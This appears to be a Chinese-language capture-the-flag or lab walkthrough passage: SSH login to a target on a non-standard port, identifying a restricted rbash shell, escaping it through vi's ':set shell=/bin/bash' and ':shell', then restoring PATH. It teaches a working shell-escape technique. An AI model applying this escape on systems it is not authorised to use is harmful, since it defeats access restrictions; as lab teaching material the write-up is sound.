1、
```bash
ssh tom@<target-ip> -p 7744
# 输入 tom 的密码
```
	SSH 开放的是 7744 非标准端口，登录时用 `-p 7744` 指定。
2、发现受限 Shell
登录后执行命令，发现很多命令无法使用，提示不是全功能的 bash。

	这是 rbash（restricted bash，受限 Shell）。在 rbash 中：
		不能执行带路径的命令（如 `/bin/sh`）
    
		不能切换目录
    
		不能重定向输出
    
		环境变量被严格限制
3、rbash逃逸
```bash
# 方法：利用有权限的编辑器
vi
# 在 vi 中输入：
:set shell=/bin/bash
:shell
```
	`vi` 编辑器在 rbash 中通常是可以运行的
     vi 有一个特性：可以调用外部 Shell
     `:set shell=/bin/bash` 设置 vi 调用的 Shell 为完整 bash
     `:shell` 执行后，你就获得了完整的 bash 环境
4、修复环境变量
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
```
	逃逸后的 Shell 环境变量可能不完整，导致很多命令找不到。手动恢复 `PATH` 和 `SHELL`，让系统命令正常可用。
